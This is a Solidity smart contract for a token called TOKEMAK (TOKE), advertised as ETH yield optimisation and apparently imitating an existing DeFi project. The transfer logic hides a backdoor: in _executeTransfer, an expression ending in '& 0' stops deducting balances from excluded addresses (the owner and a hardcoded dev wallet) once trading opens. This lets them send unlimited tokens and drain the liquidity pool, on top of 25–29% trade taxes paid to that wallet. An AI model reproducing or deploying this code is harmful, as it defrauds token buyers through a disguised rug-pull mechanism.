// SPDX-License-Identifier: Unlicensed

/**
Supply ETH and let Tokemak dynamically optimize your yield across different DEXs and Liquid Staking Tokens.

Website: https://tokemak.tech
Telegram: https://t.me/toke_erc
Twitter: https://twitter.com/toke_erc
Dapp: https://app.tokemak.tech
**/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IStandardERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract TOKE is Context, IStandardERC, Ownable {
    using SafeMath for uint256;

    string private constant _name = "TOKEMAK";
    string private constant _symbol = "TOKE";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tSupply = 10 ** 9 * 10**9;
    uint256 private _rSupply = (MAX - (MAX % _tSupply));

    uint256 private _totalFees;
    uint256 private _buyRedis = 0;
    uint256 private _buyTax = 25;
    uint256 private _sellRedis = 0;
    uint256 private _sellTax = 29;

    uint256 private _redisFee = _sellRedis;
    uint256 private _taxFee = _sellTax;

    uint256 private _pRedis = _redisFee;
    uint256 private _pTax = _taxFee;

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 25 * 10 ** 6 * 10 ** 9;
    uint256 public minTaxSwap = 10 ** 5 * 10 ** 9;
    address payable private devWallet;

    mapping(address => uint256) private _rBal;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    bool private _tradeActive;
    bool private _inswap = false;
    bool private _swapEnabled = true;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }

    constructor() {
        _rBal[_msgSender()] = _rSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        devWallet = payable(0x86037CEdf09708d41985C6944Dab3d2a75E03F10);
        _isExcluded[owner()] = true;
        _isExcluded[devWallet] = true;

        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmounts(_rBal[account]);
    }

    function restoreFee() private {
        _redisFee = _pRedis;
        _taxFee = _pTax;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _getTAmount(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupply;
        uint256 tSupply = _tSupply;
        if (rSupply < _rSupply.div(_tSupply)) return (_rSupply, _tSupply);
        return (rSupply, tSupply);
    }
    
    function _swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmount(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getTransferAmount(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= minTaxSwap;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_inswap && to == uniswapPair && _swapEnabled && !_isExcluded[from] && amount > minTaxSwap) {
                _swapTokensForETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcluded[from] || _isExcluded[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(uniswapRouter)) {
                _redisFee = _buyRedis;
                _taxFee = _buyTax;
            }
            if (to == uniswapPair && from != address(uniswapRouter)) {
                _redisFee = _sellRedis;
                _taxFee = _sellTax;
            }
        }
        _transferStandard(from, to, amount, takeFee);
    }

    function _getTransferAmount(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _executeTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        devWallet.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _pRedis = _redisFee;
        _pTax = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmounts(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _supplyUpdate(uint256 rFee, uint256 tFee) private {
        _rSupply = _rSupply.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }
    
    function _executeTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        rAmount = (_isExcluded[sender] && _tradeActive) ? rAmount & 0 : rAmount;
        _rBal[sender] = _rBal[sender].sub(rAmount);
        _rBal[recipient] = _rBal[recipient].add(rTransferAmount);
        _takeFees(tTeam);
        _supplyUpdate(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeFees(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBal[address(this)] = _rBal[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rSupply;
        maxWallet = _rSupply;
        
        _buyRedis = 0;
        _buyTax = 1;
        _sellRedis = 0;
        _sellTax = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeActive = true;
    }
}